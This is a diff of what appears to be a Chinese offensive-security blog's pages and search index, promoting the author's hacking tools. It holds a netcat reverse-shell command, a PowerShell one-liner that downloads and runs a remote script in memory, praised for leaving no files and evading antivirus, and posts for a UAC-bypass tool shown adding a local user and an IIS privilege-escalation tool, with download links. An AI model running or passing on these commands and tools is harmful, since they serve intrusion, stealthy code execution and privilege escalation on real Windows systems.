@@ -1382,7 +1382,7 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
 <h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><p>Ladon ReverseTcp 192.168.1.110 4444 nc</p>
 <h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>其它方法反弹，Ladon也支持</p>
 <h3 id="执行CMD命令"><a href="#执行CMD命令" class="headerlink" title="执行CMD命令"></a>执行CMD命令</h3><p>不勾选PowerShell或PowerLadon，默认即是正常的CMD命令</p>
-<h3 id="执行PowerShell命令-加密"><a href="#执行PowerShell命令-加密" class="headerlink" title="执行PowerShell命令(加密)"></a>执行PowerShell命令(加密)</h3><p>优点：有一定的反查效果（虽说Base64形同虚设，但也比完全不加密好一点）<br>勾选PowerShell，在CMD框中输入PowerShell命令或代码，执行的时候自动加密<br><img alt data-original="http://k8gege.org/k8img/Ladon/gui/ncpowershell.PNG"></p>
+<h3 id="执行PowerShell命令-加密"><a href="#执行PowerShell命令-加密" class="headerlink" title="执行PowerShell命令(加密)"></a>执行PowerShell命令(加密)</h3><p>优点：有一定的反查效果（虽说Base64形同虚设，但也比完全不加密好一点）<br>勾选PowerShell，在CMD框中输入PowerShell命令或代码，执行的时候自动加密<br>当然你也可以使用NC旁边的PowerShell，里面有很多随机混淆PowerShell的方法<br><img alt data-original="http://k8gege.org/k8img/Ladon/gui/ncpowershell.PNG"></p>
 <h3 id="一键搭建WEB服务器"><a href="#一键搭建WEB服务器" class="headerlink" title="一键搭建WEB服务器"></a>一键搭建WEB服务器</h3><p>将Ladon.ps1和Ladon.exe放到VPS或内网中，使用Ladon web 800搭建Web服务器<br><img alt data-original="http://k8gege.org/k8img/Ladon/gui/Ladon_web.PNG"></p>
 <h3 id="远程内存加载Ladon扫描"><a href="#远程内存加载Ladon扫描" class="headerlink" title="远程内存加载Ladon扫描"></a>远程内存加载Ladon扫描</h3><p>优点：1.无文件落地 2.免杀 3.无操作痕迹<br>执行NC反弹后，填写对应Ladon.ps1的下载地址并勾选PowerLadon，然后就可以像使用EXE或CS版那样使用Ladon了<br><img alt data-original="http://k8gege.org/k8img/Ladon/gui/NC_PowerLadon.PNG"></p>
 <h3 id="Cmd远程加载Ladon"><a href="#Cmd远程加载Ladon" class="headerlink" title="Cmd远程加载Ladon"></a>Cmd远程加载Ladon</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"</span></span><br></pre></td></tr></table></figure>
@@ -4410,6 +4410,29 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
       </tags>
   </entry>
   <entry>
+    <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
+    <url>/p/41e1c61c.html</url>
+    <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
+<p>工具: k8uac<br>编译: VC++</p>
+<p>作者:K8哥哥<br>发布:&nbsp;2018/11/25 1:30</p>
+<p>这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。</p>
+<p>不但支持全系统而且还免杀,你让我上哪说理去。</p>
+<p>免杀报告:<a href="http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6" target="_blank">http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6</a></p>
+<p>示例如下:</p>
+<p>C:\Users\K8team\Desktop&gt;k8uac<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>useage:k8uac cmdline<br><br>C:\Users\K8team\Desktop&gt;k8uac "net user k8test k8test /add"<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>success!<br>0操作成功完成。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8uac.png"></p>
+<p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
+      <categories>
+        <category>提权</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>BypassUAC</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2019-9621 Zimbra&lt;8.8.11 GetShell Exploit</title>
     <url>/p/19452dd9.html</url>
     <content><![CDATA[<table style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 12px; line-height: 1.5; font-family: 宋体, sans-serif, microsoft yahei, 微软雅黑, tahoma, arial; width: 567px;">
@@ -4568,29 +4591,6 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
       </tags>
   </entry>
   <entry>
-    <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
-    <url>/p/41e1c61c.html</url>
-    <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
-<p>工具: k8uac<br>编译: VC++</p>
-<p>作者:K8哥哥<br>发布:&nbsp;2018/11/25 1:30</p>
-<p>这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。</p>
-<p>不但支持全系统而且还免杀,你让我上哪说理去。</p>
-<p>免杀报告:<a href="http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6" target="_blank">http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6</a></p>
-<p>示例如下:</p>
-<p>C:\Users\K8team\Desktop&gt;k8uac<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>useage:k8uac cmdline<br><br>C:\Users\K8team\Desktop&gt;k8uac "net user k8test k8test /add"<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>success!<br>0操作成功完成。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8uac.png"></p>
-<p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>BypassUAC</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>mimikatz 2.1.1一键版 &amp; PowerShell</title>
     <url>/p/77429fa6.html</url>
     <content><![CDATA[<p>无需任何参数,运行EXE即可自动读取Windows系统密码</p>
@@ -4660,33 +4660,6 @@ exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</cod
         <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>Weblogic</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>全版本IIS提权工具iislpe</title>
-    <url>/p/6b9b3afe.html</url>
-    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
-<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
-<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
-<p><strong>原理:</strong></p>
-<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
-<p><strong>用法:</strong></p>
-<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
-<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
-<p>&nbsp;</p>
-<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
-<p>&nbsp; &nbsp;&nbsp; </p>
-<p>&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>LPE</tag>
-        <tag>IIS</tag>
       </tags>
   </entry>
   <entry>
@@ -4764,6 +4737,33 @@ from pprint import pprint
         <tag>Tool</tag>
         <tag>Code</tag>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>全版本IIS提权工具iislpe</title>
+    <url>/p/6b9b3afe.html</url>
+    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
+<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
+<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
+<p><strong>原理:</strong></p>
+<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
+<p><strong>用法:</strong></p>
+<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
+<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
+<p>&nbsp;</p>
+<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
+<p>&nbsp; &nbsp;&nbsp; </p>
+<p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
+      <categories>
+        <category>提权</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>LPE</tag>
+        <tag>IIS</tag>
       </tags>
   </entry>
 </search>
